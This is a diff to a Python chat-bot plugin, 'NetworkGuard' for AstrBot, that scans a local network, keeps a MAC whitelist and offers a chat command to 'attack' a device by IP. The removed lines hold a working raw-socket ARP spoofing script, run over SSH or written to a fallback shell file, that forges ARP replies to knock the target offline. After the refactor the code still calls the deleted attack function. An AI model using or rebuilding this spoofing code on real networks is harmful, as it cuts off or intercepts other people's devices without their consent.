@@ -8,6 +8,7 @@ from datetime import datetime
 from astrbot.api.event import AstrMessageEvent, filter
 from astrbot.api.star import Context, Star, register
 from astrbot.api import logger
+from astrbot.core.star.filter.event_message_type import EventMessageType
 
 _PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
 _DEVICES_FILE = os.path.join(_PLUGIN_DIR, "known_devices.json")
@@ -180,170 +181,119 @@ class NetworkGuardPlugin(Star):
 
     # ========== 指令处理 ==========
 
-    @filter.command("#扫描")
-    async def handle_scan(self, event: AstrMessageEvent):
-        """扫描局域网"""
-        devices = _read_arp()
-        if not devices:
-            yield event.plain_result("❌ 未发现设备，等待 cron 更新...")
+    @filter.event_message_type(EventMessageType.ALL)
+    async def on_any_message(self, event: AstrMessageEvent):
+        msg = (event.message_str or "").strip()
+        if not msg.startswith("守卫"):
             return
-        _save_devices(devices)
-        lines = [f"📡 内网设备 ({len(devices)} 台)"]
-        for d in devices[:25]:
-            lines.append(f"  {d['ip']}  {d['mac']}")
-        yield event.plain_result("\n".join(lines))
+        event.stop_event()
+        logger.info(f"[NetworkGuard] 收到: {msg}")
 
-    @filter.command("#列表")
-    async def handle_list(self, event: AstrMessageEvent):
-        """查看已记录设备"""
-        devices = _load_devices()
-        if not devices:
-            yield event.plain_result("📭 暂无记录，请先执行 内网扫描")
+        # 守卫扫描
+        if msg == "守卫扫描":
+            devices = _read_arp()
+            if devices:
+                _save_devices(devices)
+                lines = [f"\U0001f4e1 内网设备 ({len(devices)} 台)"]
+                for d in devices[:25]:
+                    lines.append(f"  {d['ip']}  {d['mac']}")
+                yield event.plain_result("\n".join(lines))
+            else:
+                yield event.plain_result("\u274c 等待 ARP 更新...")
             return
-        wl = _get_whitelist()
-        lines = [f"📋 已记录 ({len(devices)} 台)"]
-        for d in devices:
-            tag = " ✅" if d["mac"] in wl else ""
-            lines.append(f"{tag} {d['ip']}  {d['mac']}")
-        yield event.plain_result("\n".join(lines[:30]))
 
-    @filter.command("#信任")
-    async def handle_trust(self, event: AstrMessageEvent):
-        """添加白名单: 内网信任 <MAC> <名称>"""
-        parts = (event.message_str or "").strip().split(maxsplit=2)
-        if len(parts) < 2:
-            yield event.plain_result("用法: 内网信任 <MAC地址> <名称>")
+        # 守卫列表
+        if msg == "守卫列表":
+            devices = _load_devices()
+            if not devices:
+                yield event.plain_result("\U0001f4ed 暂无记录，请先发送 守卫扫描")
+                return
+            wl = _get_whitelist()
+            lines = [f"\U0001f4cb 已记录 ({len(devices)} 台)"]
+            for d in devices:
+                tag = " \u2705" if d["mac"] in wl else ""
+                lines.append(f"{tag} {d['ip']}  {d['mac']}")
+            yield event.plain_result("\n".join(lines[:30]))
             return
-        mac = parts[1].strip().lower()
-        name = parts[2].strip() if len(parts) > 2 else "未知"
-        if mac.count(":") != 5:
-            yield event.plain_result("❌ MAC 格式错误，请使用 aa:bb:cc:dd:ee:ff 格式")
+
+        # 守卫信任 <MAC> <名称>
+        if msg.startswith("守卫信任"):
+            parts = msg.split(maxsplit=2)
+            if len(parts) < 2:
+                yield event.plain_result("用法: 守卫信任 <MAC地址> <名称>")
+                return
+            mac = parts[1].strip().lower()
+            name = parts[2].strip() if len(parts) > 2 else "未知"
+            if mac.count(":") != 5:
+                yield event.plain_result("\u274c MAC 格式错误，使用 aa:bb:cc:dd:ee:ff")
+                return
+            known = _get_cfg("known_devices", [])
+            known = [k for k in known if not k.startswith(mac)]
+            known.append(f"{mac}:{name}")
+            _save_cfg({"known_devices": known})
+            yield event.plain_result(f"\u2705 已信任 {mac} ({name})")
             return
-        known = _get_cfg("known_devices", [])
-        known = [k for k in known if not k.startswith(mac)]
-        known.append(f"{mac}:{name}")
-        _save_cfg({"known_devices": known})
-        yield event.plain_result(f"✅ 已信任 {mac} ({name})")
 
-    @filter.command("#移除")
-    async def handle_untrust(self, event: AstrMessageEvent):
-        """移除白名单: 内网移除 <MAC>"""
-        parts = (event.message_str or "").strip().split()
-        if len(parts) < 2:
-            yield event.plain_result("用法: 内网移除 <MAC地址>")
+        # 守卫移除 <MAC>
+        if msg.startswith("守卫移除"):
+            parts = msg.split()
+            if len(parts) < 2:
+                yield event.plain_result("用法: 守卫移除 <MAC地址>")
+                return
+            mac = parts[1].strip().lower()
+            known = _get_cfg("known_devices", [])
+            new_k = [k for k in known if not k.startswith(mac)]
+            if len(new_k) == len(known):
+                yield event.plain_result(f"\u2139\ufe0f 未找到 {mac}")
+                return
+            _save_cfg({"known_devices": new_k})
+            yield event.plain_result(f"\u2705 已移除 {mac}")
             return
-        mac = parts[1].strip().lower()
-        known = _get_cfg("known_devices", [])
-        new_k = [k for k in known if not k.startswith(mac)]
-        if len(new_k) == len(known):
-            yield event.plain_result(f"ℹ️ 未找到 {mac}")
+
+        # 守卫攻击 <IP> [秒数]
+        if msg.startswith("守卫攻击"):
+            parts = msg.split()
+            if len(parts) < 2:
+                yield event.plain_result("用法: 守卫攻击 <IP地址> [秒数]")
+                return
+            ip = parts[1]
+            dur = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 60
+            gw = _get_cfg("subnet", "192.168.31.0/24").rsplit(".", 1)[0] + ".1"
+            yield event.plain_result(f"\u2694\ufe0f 正在攻击 {ip}，持续 {dur} 秒...")
+            asyncio.create_task(self._do_attack(ip, gw, dur))
+            yield event.plain_result(f"\u2705 攻击任务已启动，{dur} 秒后恢复")
             return
-        _save_cfg({"known_devices": new_k})
-        yield event.plain_result(f"✅ 已移除 {mac}")
 
-    @filter.command("#攻击")
-    async def handle_attack(self, event: AstrMessageEvent):
-        """ARP 攻击踢下线: 内网攻击 <IP> [秒数]"""
-        parts = (event.message_str or "").strip().split()
-        if len(parts) < 2:
-            yield event.plain_result("用法: 内网攻击 <IP地址> [持续时间秒]")
+        # 守卫停止 <IP>
+        if msg.startswith("守卫停止"):
+            parts = msg.split()
+            if len(parts) < 2:
+                yield event.plain_result("用法: 守卫停止 <IP地址>")
+                return
+            ip = parts[1]
+            _ssh_cmd(f"arp -d {ip} 2>/dev/null; ip neigh flush dev eno1 to {ip} 2>/dev/null")
+            yield event.plain_result(f"\u2705 已尝试恢复 {ip}")
             return
-        ip = parts[1]
-        dur = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 60
-        gw = _get_cfg("subnet", "192.168.31.0/24").rsplit(".", 1)[0] + ".1"
 
-        yield event.plain_result(f"⚔️ 正在攻击 {ip}，持续 {dur} 秒...")
-        asyncio.create_task(self._do_attack(ip, gw, dur))
-        yield event.plain_result(f"✅ 攻击任务已启动，{dur} 秒后自动恢复")
-
-    async def _do_attack(self, target_ip: str, gw_ip: str, duration: int):
-        """执行 ARP 攻击"""
-        script = f'''python3 -c "
-import socket, struct, time
-def mb(m): return bytes.fromhex(m.replace(':',''))
-def ib(ip): return bytes(int(x) for x in ip.split('.'))
-try:
-    with open('/sys/class/net/eno1/address') as f: mymac = f.read().strip()
-except: mymac = '00:00:00:00:00:00'
-sm = mb(mymac); fm = mb('00:00:00:00:00:01'); gw = '{gw_ip}'; ti = '{target_ip}'
-sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-sock.bind(('eno1', 0))
-end = time.time() + {duration}; cnt = 0
-while time.time() < end:
-    gm = None; tm = None
-    try:
-        for l in open('/AstrBot/data/arp_cache.txt'):
-            p = l.strip().split()
-            if len(p) >= 5 and p[0] == gw and 'lladdr' in l: gm = mb(p[p.index('lladdr')+1])
-            if len(p) >= 5 and p[0] == ti and 'lladdr' in l: tm = mb(p[p.index('lladdr')+1])
-    except: pass
-    if not gm: gm = fm
-    if not tm: tm = fm
-    pkt1 = gm + sm + struct.pack('!H',0x0806) + struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib(gw) + fm + ib(ti)
-    pkt2 = tm + sm + struct.pack('!H',0x0806) + struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib(ti) + fm + ib(gw)
-    sock.send(pkt1); sock.send(pkt2); cnt += 2
-    time.sleep(0.5)
-sock.close()
-print(f'Done: {{cnt}} packets')
-"'''
-        out = _ssh_cmd(script, duration + 15)
-        if out:
-            logger.info(f"[NetworkGuard] ARP 攻击: {out.strip()[:100]}")
-        else:
-            # SSH 失败，写命令文件到共享目录供主机执行
-            logger.warning("[NetworkGuard] SSH失败，尝试备用方案")
-            await self._fallback_attack(target_ip, gw_ip, duration)
-
-    async def _fallback_attack(self, target_ip: str, gw_ip: str, duration: int):
-        """备用方案：写攻击脚本到共享目录"""
-        script_content = f"""#!/bin/bash
-python3 -c "
-import socket, struct, time
-def mb(m): return bytes.fromhex(m.replace(':',''))
-def ib(ip): return bytes(int(x) for x in ip.split('.'))
-sm = mb(open('/sys/class/net/eno1/address').read().strip())
-fm = mb('00:00:00:00:00:01')
-sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-sock.bind(('eno1', 0))
-end = time.time() + {duration}; cnt = 0
-while time.time() < end:
-    eth = b'\\\\xff'*6 + sm + struct.pack('!H',0x0806)
-    arp = struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib('{gw_ip}') + fm + ib('{target_ip}')
-    sock.send(eth+arp); cnt += 1; time.sleep(1)
-sock.close()
-print(f'Done: {{cnt}}')
-"
-"""
-        try:
-            script_file = "/vol1/@appdata/astrbot/data/arp_attack.sh" if os.path.exists("/vol1/@appdata/astrbot/data/") else "/AstrBot/data/arp_attack.sh"
-            with open("/AstrBot/data/arp_attack.sh", "w") as f:
-                f.write(script_content)
-            os.chmod("/AstrBot/data/arp_attack.sh", 0o755)
-            logger.info(f"[NetworkGuard] 攻击脚本已写入: {script_file}")
-        except Exception as e:
-            logger.error(f"[NetworkGuard] 备用方案失败: {e}")
-
-    @filter.command("#停止")
-    async def handle_stop(self, event: AstrMessageEvent):
-        """恢复设备网络"""
-        parts = (event.message_str or "").strip().split()
-        if len(parts) < 2:
-            yield event.plain_result("用法: 内网停止 <IP地址>")
+        # 守卫帮助
+        if msg == "守卫帮助":
+            yield event.plain_result(
+                "\U0001f4e1 内网监控守卫\n\n"
+                "守卫扫描 - 列出当前设备\n"
+                "守卫列表 - 查看已记录\n"
+                "守卫信任 <MAC> <名称> - 白名单\n"
+                "守卫移除 <MAC> - 移出白名单\n"
+                "守卫攻击 <IP> [秒数] - ARP踢下线\n"
+                "守卫停止 <IP> - 恢复网络\n"
+                "守卫帮助 - 本帮助"
+            )
             return
-        ip = parts[1]
-        _ssh_cmd(f"arp -d {ip} 2>/dev/null; ip neigh flush dev eno1 to {ip} 2>/dev/null")
-        yield event.plain_result(f"✅ 已尝试恢复 {ip}")
 
-    @filter.command("#帮助")
-    async def handle_help(self, event: AstrMessageEvent):
-        yield event.plain_result(
-            "📡 内网监控守卫\n\n"
-            "内网扫描 — 列出当前设备\n"
-            "内网列表 — 查看已记录\n"
-            "内网信任 <MAC> <名称> — 白名单\n"
-            "内网移除 <MAC> — 移出白名单\n"
-            "内网攻击 <IP> [秒数] — ARP踢下线\n"
-            "内网停止 <IP> — 恢复网络\n"
-            "内网帮助 — 本帮助\n\n"
-            "💡 发送指令不需加 / 前缀"
-        )
+        yield event.plain_result(f"未知指令: {msg}，发送 守卫帮助 查看帮助")
+
+
+
+
+
+
+
